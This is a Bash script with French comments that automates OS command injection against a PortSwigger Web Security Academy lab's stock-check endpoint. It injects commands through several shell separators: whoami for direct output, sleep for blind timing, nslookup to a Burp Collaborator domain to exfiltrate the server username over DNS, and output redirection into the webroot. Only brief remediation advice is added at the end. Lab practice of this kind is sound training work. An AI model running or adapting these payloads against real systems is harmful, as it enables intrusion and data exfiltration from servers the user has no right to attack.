#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
STOCK_PATH="/product/stock"
OAST_DOMAIN="your-collaborator-id.burpcollaborator.net"
STATIC_PATH="/whoami.txt"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Injection directe (commande visible dans la réponse)
test_direct_injection() {
    print_sep
    echo "[1] Test d'injection OS (commande visible dans la réponse)"
    for sep in ";" "|" "&&" "&"; do
        payload="1${sep}whoami"
        resp=$(curl -sk --data "productId=$payload&storeId=1" "$TARGET_URL$STOCK_PATH")
        if echo "$resp" | grep -Eqi "root|www-data|user|admin"; then
            echo "  [+] Commande exécutée avec séparateur '$sep' !"
            echo "$resp" | grep -E "root|www-data|user|admin"
            return
        fi
    done
    echo "  [-] Pas de résultat direct visible."
}

# 2. Injection aveugle (timing)
test_blind_timing() {
    print_sep
    echo "[2] Test d'injection aveugle par timing"
    for sep in ";" "|" "&&" "&"; do
        payload="1${sep}sleep 5"
        start=$(date +%s)
        curl -sk --max-time 10 --data "productId=$payload&storeId=1" "$TARGET_URL$STOCK_PATH" > /dev/null
        end=$(date +%s)
        dt=$((end - start))
        if [[ $dt -ge 5 ]]; then
            echo "  [+] Injection aveugle détectée par délai avec '$sep' (délai $dt s) !"
            return
        fi
    done
    echo "  [-] Pas de délai détecté (pas d'injection aveugle classique)."
}

# 3. Injection out-of-band (OAST / DNS exfiltration)
test_oast_dns() {
    print_sep
    echo "[3] Test d'injection out-of-band (OAST/DNS exfiltration)"
    for sep in ";" "|" "&&" "&"; do
        payload="1${sep}nslookup test.$OAST_DOMAIN"
        curl -sk --data "productId=$payload&storeId=1" "$TARGET_URL$STOCK_PATH" > /dev/null
        echo "  [Info] Vérifiez sur Burp Collaborator ou votre serveur DNS si une requête test.$OAST_DOMAIN a été reçue."
    done
}

# 4. Exfiltration de données via OAST (whoami dans DNS)
test_oast_exfiltration() {
    print_sep
    echo "[4] Exfiltration de données via OAST (whoami dans DNS)"
    for sep in ";" "|" "&&" "&"; do
        payload="1${sep}nslookup \`whoami\`.$OAST_DOMAIN"
        curl -sk --data "productId=$payload&storeId=1" "$TARGET_URL$STOCK_PATH" > /dev/null
        echo "  [Info] Vérifiez sur Burp Collaborator si une requête <user>.$OAST_DOMAIN a été vue (le nom d'utilisateur du serveur)."
    done
}

# 5. Exfiltration de données via redirection de sortie (fichier dans webroot)
test_file_exfiltration() {
    print_sep
    echo "[5] Exfiltration de données via fichier dans le webroot"
    for sep in ";" "|" "&&" "&"; do
        payload="1${sep}whoami > /var/www/html$STATIC_PATH"
        curl -sk --data "productId=$payload&storeId=1" "$TARGET_URL$STOCK_PATH" > /dev/null
        url="$TARGET_URL$STATIC_PATH"
        resp=$(curl -sk "$url")
        if [[ ! -z "$resp" ]]; then
            echo "  [+] Fichier exfiltré trouvé à $url :"
            echo "$resp"
            return
        fi
    done
    echo "  [-] Pas de fichier exfiltré détecté (ou chemin webroot incorrect)."
}

# 6. Conseils/remédiation
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Ne jamais concaténer d'entrée utilisateur dans des commandes système."
    echo "- Utilisez des API système sécurisées (ex: execve, pas system/sh)."
    echo "- Filtrez et validez strictement toutes les entrées utilisateur."
    echo "- Pour les labs PortSwigger, testez tous les séparateurs et vecteurs (timing, OAST, redirection, etc.)."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/os-command-injection"
}

# 7. Synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Injection directe (commande dans la réponse)."
    echo "2. Injection aveugle (timing/sleep)."
    echo "3. Injection out-of-band (OAST/DNS)."
    echo "4. Exfiltration de données (DNS, fichier webroot)."
    echo "5. Contrôle automatisé ou semi-automatisé de la réponse."
    echo "6. Conseils de remédiation PortSwigger."
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger OS Command Injection : analyse, attaque et contrôle ==="
test_direct_injection
test_blind_timing
test_oast_dns
test_oast_exfiltration
test_file_exfiltration
print_remediation
print_summary

# End of script
